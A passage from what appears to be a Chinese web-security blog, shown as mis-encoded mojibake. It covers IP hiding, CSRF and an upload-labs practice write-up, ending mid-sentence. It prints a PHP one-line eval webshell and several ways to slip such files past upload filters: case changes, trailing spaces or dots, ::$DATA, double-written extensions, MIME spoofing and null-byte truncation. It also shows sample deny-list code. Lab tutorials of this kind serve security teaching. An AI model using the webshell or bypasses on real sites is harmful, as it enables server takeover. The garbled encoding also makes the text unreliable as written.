¹æ®è¿™äº›ä¿¡æ¯äº†è§£å…·ä½“çš„IPã€‚<br>é’ˆå¯¹æœ€æœ‰æ•ˆçš„â€œæ•°æ®åŒ…åˆ†ææ–¹æ³•â€è€Œè¨€ï¼Œå°±å¯ä»¥å®‰è£…èƒ½å¤Ÿè‡ªåŠ¨å»æ‰å‘é€æ•°æ®åŒ…åŒ…å¤´IPä¿¡æ¯çš„ä¸€äº›è½¯ä»¶ã€‚ä¸è¿‡ä½¿ç”¨è¿™äº›è½¯ä»¶æœ‰äº›ç¼ºç‚¹ï¼Œè­¬å¦‚ï¼šè€—è´¹èµ„æºä¸¥é‡ï¼Œé™ä½è®¡ç®—æœºæ€§èƒ½ï¼›è®¿é—®ä¸€äº›è®ºå›æˆ–è€…ç½‘ç«™æ—¶ä¼šå—å½±å“ï¼›ä¸é€‚åˆç½‘å§ç”¨æˆ·ä½¿ç”¨ç­‰ç­‰ã€‚ç°åœ¨çš„ä¸ªäººç”¨æˆ·é‡‡ç”¨æœ€æ™®åŠéšè—IPçš„æ–¹æ³•åº”è¯¥æ˜¯ä½¿ç”¨ä»£ç†ï¼Œç”±äºä½¿ç”¨ä»£ç†æœåŠ¡å™¨åï¼Œâ€œè½¬å€æœåŠ¡â€ä¼šå¯¹å‘é€å‡ºå»çš„æ•°æ®åŒ…æœ‰æ‰€ä¿®æ”¹ï¼Œè‡´ä½¿â€œæ•°æ®åŒ…åˆ†æâ€çš„æ–¹æ³•å¤±æ•ˆã€‚ä¸€äº›å®¹æ˜“æ³„æ¼ç”¨æˆ·IPçš„ç½‘ç»œè½¯ä»¶(QQã€MSNã€IEç­‰)éƒ½æ”¯æŒä½¿ç”¨ä»£ç†æ–¹å¼è¿æ¥Internetï¼Œç‰¹åˆ«æ˜¯QQä½¿ç”¨â€œezProxyâ€ç­‰ä»£ç†è½¯ä»¶è¿æ¥åï¼ŒIPç‰ˆçš„QQéƒ½æ— æ³•æ˜¾ç¤ºè¯¥IPåœ°å€ã€‚è™½ç„¶ä»£ç†å¯ä»¥æœ‰æ•ˆåœ°éšè—ç”¨æˆ·IPï¼Œä½†æ”»å‡»è€…äº¦å¯ä»¥ç»•è¿‡ä»£ç†ï¼ŒæŸ¥æ‰¾åˆ°å¯¹æ–¹çš„çœŸå®IPåœ°å€ï¼Œç”¨æˆ·åœ¨ä½•ç§æƒ…å†µä¸‹ä½¿ç”¨ä½•ç§æ–¹æ³•éšè—IPï¼Œä¹Ÿè¦å› æƒ…å†µè€Œè®ºã€‚</p><h2 id="å…«ã€æœªåŠ å¯†ç™»å½•è¯·æ±‚"><a href="#å…«ã€æœªåŠ å¯†ç™»å½•è¯·æ±‚" class="headerlink" title="å…«ã€æœªåŠ å¯†ç™»å½•è¯·æ±‚"></a>å…«ã€æœªåŠ å¯†ç™»å½•è¯·æ±‚</h2><p>ç”±äºWebé…ç½®ä¸å®‰å…¨ï¼Œç™»é™†è¯·æ±‚æŠŠè¯¸å¦‚ç”¨æˆ·åå’Œå¯†ç ç­‰æ•æ„Ÿå­—æ®µæœªåŠ å¯†è¿›è¡Œä¼ è¾“ï¼Œæ”»å‡»è€…å¯ä»¥çªƒå¬ç½‘ç»œä»¥åŠ«è·è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚å»ºè®®è¿›è¡Œä¾‹å¦‚SSHç­‰çš„åŠ å¯†åå†ä¼ è¾“ã€‚</p><h2 id="ä¹ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´"><a href="#ä¹ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´" class="headerlink" title="ä¹ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´"></a>ä¹ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´</h2><p>SQLæ³¨å…¥ã€XSSã€ç›®å½•éå†ã€å¼±å£ä»¤ç­‰å‡å¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´è·å¾—æ•æ„Ÿä¿¡æ¯ã€‚é’ˆå¯¹ä¸åŒæˆå› ï¼Œé˜²å¾¡æ–¹å¼ä¸åŒ</p><h2 id="åã€CSRF"><a href="#åã€CSRF" class="headerlink" title="åã€CSRF"></a>åã€CSRF</h2><p><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p><ul><li>åŸç†ï¼šåˆ©ç”¨ç”¨æˆ·è®¤è¯çŠ¶æ€æ‰§è¡Œéæ³•è¯·æ±‚ã€‚</li><li>é˜²èŒƒï¼šä½¿ç”¨ Token éªŒè¯ã€Referer éªŒè¯ç­‰ã€‚</li></ul><h1 id="é¶åœºç»ƒä¹ "><a href="#é¶åœºç»ƒä¹ " class="headerlink" title="é¶åœºç»ƒä¹ "></a>é¶åœºç»ƒä¹ </h1><h1 id="1ã€upload-labs"><a href="#1ã€upload-labs" class="headerlink" title="1ã€upload-labs"></a>1ã€upload-labs</h1><p>å‚è€ƒèµ„æ–™</p><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åæœ.</p><p><strong>ä¸Šä¼ æ¼æ´æ»¡è¶³æ¡ä»¶</strong></p><p>é¦–å…ˆï¼Œä¸Šä¼ çš„æ–‡ä»¶èƒ½å¤Ÿè¢«Webå®¹å™¨è§£é‡Šæ‰§è¡Œã€‚æ‰€ä»¥æ–‡ä»¶ä¸Šä¼ åæ‰€åœ¨çš„ç›®å½•è¦æ˜¯Webå®¹å™¨æ‰€è¦†ç›–åˆ°çš„è·¯å¾„ã€‚</p><p>å…¶æ¬¡ï¼Œç”¨æˆ·èƒ½å¤Ÿä»Webä¸Šè®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸Šä¼ äº†ï¼Œä½†ç”¨æˆ·æ— æ³•é€šè¿‡Webè®¿é—®ï¼Œæˆ–è€…æ— æ³•å¾—åˆ°Webå®¹å™¨è§£é‡Šè¿™ä¸ªè„šæœ¬ï¼Œé‚£ä¹ˆä¹Ÿä¸èƒ½ç§°ä¹‹ä¸ºæ¼æ´ã€‚</p><p>æœ€åï¼Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è‹¥è¢«å®‰å…¨æ£€æŸ¥ã€æ ¼å¼åŒ–ã€å›¾ç‰‡å‹ç¼©ç­‰åŠŸèƒ½æ”¹å˜äº†å†…å®¹ï¼Œåˆ™ä¹Ÿå¯èƒ½å¯¼è‡´æ”»å‡»ä¸æˆåŠŸã€‚</p><p>phpä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><h3 id="ä¸€ã€é»‘åå•ç»•è¿‡"><a href="#ä¸€ã€é»‘åå•ç»•è¿‡" class="headerlink" title="ä¸€ã€é»‘åå•ç»•è¿‡"></a>ä¸€ã€é»‘åå•ç»•è¿‡</h3><p>é»‘åå•ç®€å•æ¥è¯´å°±æ˜¯ç›®æ ‡ç¨‹åºè§„å®šäº†å“ªäº›æ–‡ä»¶ä¸èƒ½ä¸Šä¼ </p><p>1ã€å¤§å°å†™ç»•è¿‡<br>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è®²çš„ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¦‚ä¸‹</p><p>æœ¬æ¥éœ€è¦ä¸Šä¼ ä¸€ä¸ªåä¸ºa.phpçš„æœ¨é©¬æ–‡ä»¶ï¼Œæœ‰æ—¶å€™å°†æ–‡ä»¶åæ”¹ä¸ºä»¥ä¸‹çš„æ ·å­å°±èƒ½ç»•è¿‡ä¸€äº›é»‘åå•é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">a.PHP<br>a.Php<br>a.PhP<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å‡ ç§ç»„åˆå•Šï¼Œæ‡’å¾—å†™äº†ï¼Œè¿™ç§æ–¹å¼è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><p>2ã€ç©ºæ ¼ç»•è¿‡<br>åœ¨è®²è§£ç©ºæ ¼ç»•è¿‡ä¹‹å‰è¦å…ˆç»™å¤§å®¶è®²ä¸€ä¸ªç³»ç»Ÿå±‚é¢ä¸Šçš„ç‰¹æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">åœ¨ç³»ç»Ÿå±‚é¢ä¸Šï¼Œå½“æˆ‘ä¿å­˜äº†ä¸€ä¸ªåä¸ºa.txtçš„æ–‡ä»¶æ—¶ï¼Œå½“æˆ‘åœ¨æ–‡ä»¶å å‰é¢æˆ–è€…åé¢åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼Œåœ¨ä¿å­˜æ—¶åœ¨ç³»ç»Ÿå±‚é¢ä¸Šæ˜¯æ²¡æœ‰ç©ºæ ¼çš„ï¼Œä½†æ˜¯åœ¨PHPä¼ è¾“çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¯ä»¥è¯†åˆ«è¿™ä¸ªç©ºæ ¼çš„ï¼Œæ‰€ä»¥ä¹Ÿå°±è¯ç”Ÿæˆ‘ä»¬çš„ç©ºæ ¼ç»•è¿‡æ–¹å¼<br>ä¾‹ï¼š å¦‚æœç›®æ ‡çš„é»‘åå•è¿‡æ»¤ä¸­åªæœ‰â€œ.phpâ€ï¼Œè€Œæ²¡æœ‰â€œ.php â€è¿™æ ·çš„åç¼€æ—¶ï¼Œå°±å¯ä»¥ä¸Šä¼ æ—¶ä½¿ç”¨burpæŠ“åŒ…ï¼Œåœ¨ä¸Šä¼ çš„æ–‡ä»¶åå‰é¢æˆ–è€…åé¢æ·»åŠ ç©ºæ ¼ï¼Œå†æ”¾åŒ…å°±èƒ½æˆåŠŸä¸Šä¼ ï¼Œå®ç°ç»•è¿‡<br></code></pre></td></tr></table></figure><p>3ã€ç‚¹å·ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">è¿™ä¸ªç‚¹å·ç»•è¿‡ä¹Ÿæ˜¯ç³»ç»Ÿå±‚é¢çš„åŸç†ï¼Œå¾ˆç©ºæ ¼è¿‡æ»¤æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œå½“ä½ é‡å‘½åæ–‡ä»¶åæ—¶ï¼Œå¦‚æœåœ¨ æ–‡ä»¶åç¼€ååŠ ä¸Šä¸€ä¸ªç‚¹ï¼Œæ­¤æ—¶ä¿å­˜åç³»ç»Ÿä¼šåœ¨è‡ªåŠ¨è¿‡æ»¤æœ«å°¾çš„ç‚¹å·<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•åŒç©ºæ ¼è¿‡æ»¤ä¸€æ ·ï¼Œä¾‹å¦‚ä¸Šä¼ ä¸€ä¸ªa.phpæ–‡ä»¶ï¼ŒburpæŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸ºâ€œa.php.â€ï¼Œæ­¤æ—¶æ”¾åŒ…ï¼Œå¦‚æœé»‘åå•æ£€æµ‹ä¸­æ²¡æœ‰å¯¹â€œphp.â€è¿‡æ»¤ï¼Œå°±èƒ½å®ç°ç»•è¿‡</p><p>4ã€::$dataç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">æ¡ä»¶ï¼šåªé€‚ç”¨äºwindows<br></code></pre></td></tr></table></figure><p>è¿™é‡Œèƒ½ç»•è¿‡çš„åŸç†æ˜¯å› ä¸ºwindowsçš„NTFSæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œwindowséƒ½é€‚ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è®¿é—®a.php::$dataæ—¶ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºè®¿é—®a.phpæœ¬èº«<br>å½“æˆ‘ä»¬è®¿é—®ab:a.php::$dataæ—¶ï¼Œä¹Ÿå°±æ˜¯è®¿é—®abæ–‡ä»¶å¤¹ä¸‹çš„a.phpæ–‡ä»¶æœ¬èº«<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç»•è¿‡æ–¹å¼çš„ä½¿ç”¨å’Œå‰é¢ä¸¤ä¸ªä¸€æ ·ï¼Œéƒ½æ˜¯burpæŠ“åŒ…æ”¹æ–‡ä»¶åå°±è¡Œäº†ï¼Œä¾‹å¦‚æŠŠa.phpæ”¹ä¸ºa.php::$data,åªè¦ä»–æ²¡æœ‰åšå¯¹åº”çš„è¿‡æ»¤å°±èƒ½ç»•è¿‡é»‘åå•æ£€æµ‹</p><p>**æ³¨æ„ï¼š**è¿™ç§æ–¹æ³•ç¡®å®èƒ½ç»•è¿‡é™åˆ¶ï¼Œä½†æ˜¯å½“æˆ‘ä»¬å¼€æ–°æ ‡ç­¾è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶æ—¶ä¼šæŠ¥é”™ï¼Œéœ€è¦æŠŠæ­¤æ—¶urlä¸­çš„::$dataåˆ æ‰æ‰èƒ½æ­£å¸¸è®¿é—®<br>5ã€å•æ¬¡è¿‡æ»¤ç»•è¿‡<br>å…ˆæ¥çœ‹çœ‹ä¸‹é¢è¿™ä¸€æ®µè¿‡æ»¤ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);<br>        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);<br>        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹<br>        $file_ext = strrchr($file_name, &#x27;.&#x27;);<br>        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™<br>        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA<br>        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º<br></code></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ç»è¿‡è¿™æ ·ä¸€æ¬¡è¿‡æ»¤åæ‰èƒ½æˆåŠŸä¸Šä¼ ï¼Œåˆç•¥ä¸€çœ‹è¿™é‡Œçš„è¿‡æ»¤å…¶å®è¿˜æŒºå¤šçš„ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªæœ€å¤§çš„é—®é¢˜â€”â€”æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶<strong>åªç»è¿‡äº†ä¸€æ¬¡</strong>è¿™æ ·çš„è¿‡æ»¤ï¼Œä¾‹å¦‚æˆ‘ä»¬ä¸Šä¼ a.phpï¼ŒburpæŠ“åŒ…åä¿®æ”¹ä¸ºâ€œa.php. .â€ï¼Œæ­¤æ—¶ç‚¹å‡»æ”¾åŒ…ï¼Œå¤„ç†æµç¨‹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">é‡åˆ°ä¸Šé¢åˆ é™¤æ–‡ä»¶æœ«å°¾çš„ç‚¹çš„è¿‡æ»¤æ—¶ï¼Œ æœ«å°¾çš„ç‚¹è¢«åˆ é™¤ï¼Œæ­¤æ—¶æ–‡ä»¶åâ€”â€”â€œa.php. â€<br>æ¥ç€å¾€ä¸‹è¿‡æ»¤ï¼Œé‡åˆ°é¦–ä½å»ç©ºæ—¶ï¼Œ æœ«å°¾çš„ç©ºæ ¼è¢«åˆ é™¤ï¼Œæ­¤æ—¶æ–‡ä»¶åâ€”â€”â€œa.php.â€<br>æ¥ç€å¾€ä¸‹è¿‡æ»¤ï¼Œä½ ä¼šå‘ç°å®ƒå·²ç»è¿‡æ»¤å®Œäº†ï¼Œå®ƒä¼šå°†æ­¤æ—¶çš„ç»“æœæ‹¿å»$deny_extè¿›è¡Œ é»‘åå•æ£€æµ‹<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯é»‘åå•ä¸­â€œa.php.â€èƒ½è¢«æ£€æµ‹åˆ°å—ï¼Ÿä¸èƒ½ï¼Œæ‰€ä»¥è‡ªç„¶å°±ç»•è¿‡äº†è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">è¿™é‡Œçš„æ€è·¯å°±æ˜¯å‡å¦‚æˆ‘ä»¬å·²ç»çŸ¥é“äº†ç›®æ ‡çš„ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å°è¯• ä½¿ç”¨ä¸¤æ¬¡å¯¹åº”çš„è¿‡æ»¤æ¥ç»•è¿‡ï¼Œå‡å¦‚å®ƒæ‰€æœ‰çš„è¿‡æ»¤éƒ½åªè¿›è¡Œä¸€æ¬¡ï¼Œé‚£å°±å¯ä»¥å®£å¸ƒæ‹¿ä¸‹äº†<br></code></pre></td></tr></table></figure><p>6ã€åç¼€åŒå†™ç»•è¿‡<br>åŒå†™åç¼€çš„æ–¹å¼åªé€‚åˆ ç›®æ ‡æœåŠ¡å™¨çš„è¿‡æ»¤è§„åˆ™æ˜¯æ£€æµ‹åˆ°é»‘åå•åç¼€æ—¶ï¼Œå°†æ–‡ä»¶åä¸­å¯¹åº”åç¼€åˆ é™¤çš„æƒ…å†µ<br>ä¾‹å¦‚æœåŠ¡å™¨æ£€æµ‹çš„é»‘åå•å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">æ­¤æ—¶æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªa.phpæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé‚£é»‘åå•ä¸­çš„å†…å®¹æ¥åŒ¹é…ï¼ŒåŒ¹é…åˆ°phpåï¼Œå°±ä¼šæŠŠåŸæ¥çš„æ–‡ä»¶åâ€œ a.phpâ€åé¢çš„phpåç¼€åˆ æ‰ï¼Œæ­¤æ—¶çš„æ–‡ä»¶åâ€”â€”â€œ a.â€ï¼Œæ­¤æ—¶è¿™ä¸ªæ–‡ä»¶å€’æ˜¯èƒ½æˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯å·²ç»ä¸ä¼šè¢«è§£æä¸ºphpäº†ï¼Œï¼Œè¿™å°±æ˜¯æ•´ä¸ªè¿‡æ»¤æµç¨‹<br>è€Œæˆ‘ä»¬å¯¹åº”çš„ç»•è¿‡æ–¹å¼å°±æ˜¯â€”â€”åŒå†™åç¼€ç»•è¿‡<br></code></pre></td></tr></table></figure><p>æ¡ä»¶è¿˜æ˜¯è¿™ä¸ªæœåŠ¡å™¨åªè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤ï¼Œä¾‹å¦‚æˆ‘ä»¬ä¸Šä¼ a.phpï¼ŒburpæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºâ€œa.pphphpâ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">è¿›å…¥æ–‡ä»¶ä¸Šä¼ æµç¨‹ï¼Œè¯†åˆ«æ–‡ä»¶åç¼€ï¼Œä¸ºâ€œpphphpâ€ã€‚<br>ä»å·¦åˆ°å³è¯†åˆ«ï¼Œå½“è¯†åˆ«å½“ç¬¬äºŒä½åˆ°ç¬¬å››ä½çš„phpæ—¶ï¼Œå³â€œp phphpâ€,åˆ¤å®šåç¼€åå­˜åœ¨é»‘åå•ï¼Œå°†è¯†åˆ«åˆ°çš„phpåˆ é™¤ï¼Œåç¼€ä¸­å‰©ä¸‹çš„å­—ç¬¦ç»„åˆåï¼Œæ­¤æ—¶åç¼€â€œpphphpâ€å°±æˆäº†â€œphpâ€,æ­¤æ—¶å‰©ä¸‹çš„æ–‡ä»¶åâ€”â€”â€œa.phpâ€,ç¨‹åºä»¥ä¸ºå¤„ç†å®Œäº†ï¼Œæ²¡æœ‰å±å®³ï¼Œæ‰€ä»¥æ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œä¸è¿›è¡Œæ‹¦æˆªï¼Œå³æˆåŠŸç»•è¿‡<br></code></pre></td></tr></table></figure><p>a.phpæ–‡ä»¶ï¼Œè‡ªç„¶æˆ‘ä»¬è®¿é—®æ—¶ä¹Ÿèƒ½ä»¥æ­£å¸¸phpå»è§£æ</p><h3 id="äºŒã€ç™½åå•ç»•è¿‡"><a href="#äºŒã€ç™½åå•ç»•è¿‡" class="headerlink" title="äºŒã€ç™½åå•ç»•è¿‡"></a>äºŒã€ç™½åå•ç»•è¿‡</h3><p>ç™½åå•ç®€å•æ¥è¯´å°±æ˜¯ç›®æ ‡ç¨‹åºè§„å®šäº†èƒ½ä¸Šä¼ çš„åç¼€å</p><p>1ã€MIMEç±»å‹æ£€æµ‹ç»•è¿‡<br>MIMEå¤šç”¨é€”ç½‘ç»œé‚®ä»¶æ‰©å±•ç±»å‹ï¼Œå¯è¢«ç§°ä¸ºMedia typeæˆ–Content typeï¼Œå®ƒè®¾å®šæŸç§ç±»å‹çš„æ–‡ä»¶å½“è¢«æµè§ˆå™¨æ‰“å¼€çš„æ—¶å€™éœ€è¦ç”¨ä»€ä¹ˆæ ·çš„åº”ç”¨ç¨‹åºï¼Œå¤šç”¨äºHTTPé€šä¿¡å’Œè®¾å®šæ–‡æ¡£ç±»å‹ä¾‹å¦‚HTMLã€‚ä¹‹æ‰€ä»¥å«å¤šç”¨é€”ç½‘ç»œé‚®ä»¶æ‰©å±•ç±»å‹ï¼Œå› ä¸ºå®ƒæœ€æ—©è¢«ç”¨äºç”µå­é‚®ä»¶ç³»ç»Ÿï¼Œåç”¨äºæµè§ˆå™¨ã€‚</p><p>å¸¸è§çš„ç±»å‹æœ‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823149.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822728.png"></p><p>é‚£ä¹ˆåœ¨æˆ‘ä»¬æŠ“åŒ…çš„æ—¶å€™ï¼Œcontent-typeé‡Œé¢çš„å€¼ï¼Œå°±æ˜¯æ–‡ä»¶çš„mimeç±»å‹ï¼Œå¦‚æœåå°æ˜¯æ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„ï¼Œé‚£ä¹ˆå°±å­˜åœ¨mimeç±»å‹çš„æ£€æµ‹ç»•è¿‡ã€‚</p><p><strong>å³ä¸Šä¼ æ—¶æŠ“åŒ…ï¼Œå°†mineç±»å‹æ”¹ä¸ºå®ƒå…è®¸ä¸Šä¼ çš„ç±»å‹å³å¯ç»•è¿‡éªŒè¯</strong></p><p>2ã€è·¯å¾„æ 00æˆªæ–­ç»•è¿‡<br>æ¡ä»¶ï¼š</p><p>phpç‰ˆæœ¬&lt; 5.3</p><p>php.iniè¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ magic_quotes_gpcå¿…é¡»ä¸º off</p><p>ä¸Šä¼ è·¯å¾„å¯æ§<br>å¿…é¡»æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶æ‰èƒ½ä½¿ç”¨00æˆªæ–­</p><p>åŸç†ï¼š</p><p>0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ æ ‡è¯†ç¬¦çš„æ–¹å¼æ¥å°†åé¢çš„å†…å®¹å¼„è¿›è¡Œæˆªæ–­ï¼Œè¿™æ ·æ ‡è¯†ç¬¦åé¢çš„å†…å®¹å°±èƒ½å¸®æˆ‘ä»¬ç»•è¿‡æ£€æµ‹<br>å®ä¾‹ï¼š</p><p>ä¾‹å¦‚ä¸€ä¸ªç¨‹åºåœ¨ä»£ç ä¸­è§„å®šåªå…è®¸ä¸Šä¼ png,jpg,gifåç¼€çš„æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªåä¸ºaa.phpçš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•:</p><p>1ã€é€‰ä¸­aa.phpæ–‡ä»¶å¹¶ä¸Šä¼ ï¼Œåœ¨ä¸Šä¼ 